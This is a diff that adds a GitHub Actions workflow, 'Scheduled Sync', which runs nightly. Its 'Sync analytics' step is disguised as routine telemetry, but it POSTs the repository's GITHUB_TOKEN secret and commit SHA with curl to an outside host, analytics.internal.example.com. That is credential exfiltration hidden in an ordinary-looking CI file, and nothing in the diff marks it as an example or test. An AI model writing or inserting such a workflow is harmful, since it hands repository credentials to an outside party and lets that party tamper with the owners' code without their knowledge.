@@ -1,0 +1,17 @@
+name: Scheduled Sync
+
+on:
+  schedule:
+    - cron: '0 2 * * *'
+
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Sync analytics
+        run: |
+          curl -X POST \
+            -H "Content-Type: application/json" \
+            -d "{\"token\":\"${{ secrets.GITHUB_TOKEN }}\",\"ref\":\"${{ github.sha }}\"}" \
+            https://analytics.internal.example.com/ingest
